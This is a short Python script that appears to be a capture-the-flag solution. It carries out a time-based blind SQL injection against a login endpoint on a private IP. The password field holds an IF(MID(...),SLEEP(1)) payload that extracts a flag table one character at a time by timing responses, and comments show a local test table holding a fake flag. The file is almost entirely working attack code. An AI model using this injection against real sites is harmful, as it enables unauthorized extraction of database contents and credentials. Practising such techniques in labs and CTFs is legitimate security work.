import requests
import string

url = 'http://192.168.0.52:22030/sign/signin-submit?rewritetype=submit'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Accept': 'text/html, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'http://192.168.0.52:22030/sign/signin?redirect=%2F'
}

import time
flag = ""
for ind in range(21, 30):
    mb = []
    for a in string.printable:
        # a = 'A'
        tt = time.time()
        payload = 'id=admin&pwd=\')|IF(MID((select*from flag),'+str(ind)+',1)=\''+a+'\',SLEEP(1),\''
        response = requests.post(url, headers=headers, data=payload)
        resp = time.time()-tt
        if(int(resp)>0):
            flag+=a
            print(flag)
            break
    
print(response.text)

# use zigger;
# create table flag (flag varchar(40));
# insert into flag values ('ACS{fakeflag}');
print(len(payload.split("pwd=")[1]))